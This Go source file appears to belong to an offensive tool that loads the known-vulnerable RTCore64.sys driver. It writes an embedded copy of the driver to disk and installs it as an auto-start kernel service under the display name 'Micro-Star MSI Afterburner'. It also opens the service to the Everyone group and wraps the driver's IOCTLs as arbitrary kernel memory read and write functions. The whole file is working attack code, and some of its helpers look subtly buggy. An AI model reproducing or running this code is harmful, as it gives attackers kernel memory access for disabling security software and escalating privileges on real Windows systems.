package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	RTCORE64_MEMORY_READ_CODE  uint32 = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE uint32 = 0x8000204c
)
const (
	SERVICE_ALL_ACCESS = windows.SERVICE_QUERY_STATUS |
		windows.SERVICE_QUERY_CONFIG |
		windows.SERVICE_INTERROGATE |
		windows.SERVICE_ENUMERATE_DEPENDENTS |
		windows.SERVICE_PAUSE_CONTINUE |
		windows.SERVICE_START |
		windows.SERVICE_STOP |
		windows.SERVICE_USER_DEFINED_CONTROL |
		windows.READ_CONTROL
)

func getDriverHandle() windows.Handle {
	name, err := syscall.UTF16PtrFromString("\\\\.\\RTCore64")
	if err != nil {
		panic(err)
	}
	device, err := windows.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		fmt.Println("[!] Unable to obtain a handle to the device object")
		return device
	} else {
		fmt.Printf("[+] Device object handle obtained: %x\n", device)
		return device
	}
}

func writeMemoryPrimitive(device windows.Handle, s DWORD, adr DWORD64, val DWORD) {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	memRead.Value = val
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_WRITE_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
}

func writeMemoryBYTE(device windows.Handle, adr DWORD64, val DWORD64) {
	currentValue := readMemoryDWORD64(device, adr)
	val = (currentValue & 0xFFFFFFFFFFFFFFF0) | val
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func writeMemoryWORD(device windows.Handle, adr DWORD64, val DWORD64) {
	currentValue := readMemoryDWORD64(device, adr)
	val = (currentValue & 0xFFFFFFFFFFFFFF00) | val
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func writeMemoryDWORD64(device windows.Handle, adr DWORD64, val DWORD64) {
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func readMemoryPrimitive(device windows.Handle, s DWORD, adr DWORD64) DWORD {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
	return memRead.Value
}

func readMemoryBYTE(device windows.Handle, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 1, adr)) & 0xff
}

func readMemoryDWORD(device windows.Handle, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 4, adr)) & 0xffffffff
}

func readMemoryDWORD64(device windows.Handle, adr DWORD64) DWORD64 {
	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
}

func serviceAddEveryoneAccess(srvName string) error {
	trustee := windows.TRUSTEE{}
	trustee.MultipleTrustee = nil
	trustee.MultipleTrusteeOperation = windows.NO_MULTIPLE_TRUSTEE
	trustee.TrusteeForm = windows.TRUSTEE_IS_SID
	trustee.TrusteeType = windows.TRUSTEE_IS_WELL_KNOWN_GROUP
	trustee.TrusteeValue = 0

	forEveryoneACL := windows.EXPLICIT_ACCESS{}
	forEveryoneACL.AccessPermissions = SERVICE_ALL_ACCESS
	forEveryoneACL.AccessMode = windows.SET_ACCESS
	forEveryoneACL.Inheritance = windows.NO_INHERITANCE
	forEveryoneACL.Trustee = trustee

	oldSd, err := windows.GetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION)
	if err != nil {
		return err
	}
	stringSID, err := syscall.UTF16PtrFromString("S-1-1-0")
	if err != nil {
		return err
	}
	var sid *windows.SID
	err = windows.ConvertStringSidToSid(stringSID, &sid)
	if err != nil {
		return err
	}
	oldDACL, _, _ := oldSd.DACL()
	forEveryoneACL.Trustee.TrusteeValue = windows.TrusteeValueFromSID(sid)
	var newDACL *windows.ACL
	SetEntriesInAclW(1, &forEveryoneACL, oldDACL, &newDACL)
	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, newDACL, nil)
	if err != nil {
		return err
	}
	windows.FreeSid(sid)
	return nil
}

func serviceInstall(srvName string, dName string, bPath string, srvType uint32, startType uint32, startIt bool) uint32 {
	var hS windows.Handle
	//var hSc uintptr = 0
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		fmt.Println("OpenSCManager(create)")
		return uint32(err.(syscall.Errno))
	}
	serviceName, err := syscall.UTF16PtrFromString(srvName)
	if err != nil {
		panic(err)
	}
	displayName, err := syscall.UTF16PtrFromString(dName)
	if err != nil {
		panic(err)
	}
	binPath, err := syscall.UTF16PtrFromString(bPath)
	if err != nil {
		panic(err)
	}
	hS, err = windows.OpenService(hSc, serviceName, uint32(windows.SERVICE_START))
	if err == nil {
		fmt.Printf("[+] '%s' service already registered\n", srvName)
	} else {
		if err.(syscall.Errno) == windows.ERROR_SERVICE_DOES_NOT_EXIST {
			fmt.Printf("[*] '%s' service not present\n", srvName)
			hS, err = windows.CreateService(hSc, serviceName, displayName, windows.READ_CONTROL|windows.WRITE_DAC|windows.SERVICE_START, srvType,
				startType, windows.SERVICE_ERROR_NORMAL, binPath, nil, nil, nil, nil, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service successfully registered\n", srvName)
				err = serviceAddEveryoneAccess(srvName)
				if err == nil {
					fmt.Printf("[+] '%s' service ACL to everyone\n", srvName)
				} else {
					fmt.Printf("[!] '%s' ServiceAddEveryoneAccess\n", srvName)
					panic(err)
				}
			} else {
				fmt.Println("[X] CreateService")
			}
		} else {
			fmt.Println("OpenService")
		}
	}

	if uintptr(hS) != 0 {
		if startIt {
			err = windows.StartService(hS, 0, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service started\n", srvName)
			} else if err.(syscall.Errno) == windows.ERROR_SERVICE_ALREADY_RUNNING {
				fmt.Printf("[*] '%s' service already started\n", srvName)
			} else {
				fmt.Println("StartService")
				return uint32(err.(syscall.Errno))
			}
		}
		windows.CloseServiceHandle(windows.Handle(hSc))
	}
	windows.CloseServiceHandle(windows.Handle(hSc))

	return 0
}

func serviceGenericControl(srvName string, dwDesiredAccess uint32, dwControl uint32, ptrServiceStatus *windows.SERVICE_STATUS) (bool, error) {
	status := false
	var srvStatus windows.SERVICE_STATUS
	var hS windows.Handle
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		return status, err
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return status, err
	}
	if uintptr(hSc) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			return status, err
		}
		hS, err = windows.OpenService(hSc, serviceName, dwDesiredAccess)
		if err != nil {
			return status, err
		}
		if uintptr(hS) != 0 {
			err = windows.ControlService(hS, dwControl, &srvStatus)
			if err != nil {
				return status, err
			}
			windows.CloseServiceHandle(hS)
			status = true
		}
		windows.CloseServiceHandle(hSc)
	}
	return status, nil
}

func serviceUninstall(srvName string, cnt int) bool {
	deleted := false
	var hSC windows.Handle
	var hS windows.Handle
	var srvStatus windows.SERVICE_STATUS
	if cnt > 3 {
		fmt.Printf("[!] Reached maximun number of attempts (3) to uninstall the service '%s'\n", srvName)
		return false
	}
	status, err := serviceGenericControl(srvName, windows.SERVICE_STOP, windows.SERVICE_CONTROL_STOP, nil)

	if status {
		fmt.Printf("[+] '%s' service stopped\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_DOES_NOT_EXIST {
		fmt.Printf("[+] '%s' service does not exeist\n", srvName)
		return true
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_NOT_ACTIVE {
		fmt.Printf("[+] '%s' service not running\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_CANNOT_ACCEPT_CTRL {
		fmt.Printf("[*] '%s' service cannot accept control messages at this time, waiting...\n", srvName)
		time.Sleep(1000)
	} else {
		fmt.Println("ServiceUninstall")
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}

	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSC, err = windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		panic(err)
	}
	if uintptr(hSC) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			panic(err)
		}
		hS, err = windows.OpenService(hSC, serviceName, windows.SERVICE_QUERY_STATUS|windows.DELETE)
		if err != nil {
			windows.CloseServiceHandle(hSC)
			panic(err)
		}
		if uintptr(hS) != 0 {
			err = windows.QueryServiceStatus(hS, &srvStatus)
			if err != nil {
				println(uint32(err.(syscall.Errno)))
				windows.CloseServiceHandle(hSC)
				panic(err)
			}
			if !(srvStatus.CurrentState == windows.SERVICE_STOPPED) {
				windows.CloseServiceHandle(hS)
				windows.CloseServiceHandle(hSC)
				time.Sleep(1000)
				return serviceUninstall(srvName, cnt+1)
			} else {
				err = windows.DeleteService(hS)
				if err != nil {
					panic(err)
				}
				deleted = true
				windows.CloseServiceHandle(hSC)
			}
		}
		windows.CloseServiceHandle(hSC)
	}
	if !deleted {
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}
	return deleted
}

func installVulnDriver() {
	currentDir, _ := os.Getwd()
	binPath := currentDir + "/RTCore64.sys"
	os.WriteFile(binPath, binfile, 0777)
	status := serviceInstall("RTCore64", "Micro-Star MSI Afterburner", binPath, windows.SERVICE_KERNEL_DRIVER, windows.SERVICE_AUTO_START, true)
	if status == 0x05 {
		fmt.Println("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?")
	}
}

func uninstallVulnDriver() {
	status := serviceUninstall("RTCore64", 0)
	if !status {
		fmt.Println("ServiceUninstall")
	}
}
